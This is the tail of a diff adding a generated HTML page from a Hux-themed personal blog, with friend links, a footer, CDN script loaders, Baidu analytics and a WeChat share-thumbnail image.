+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
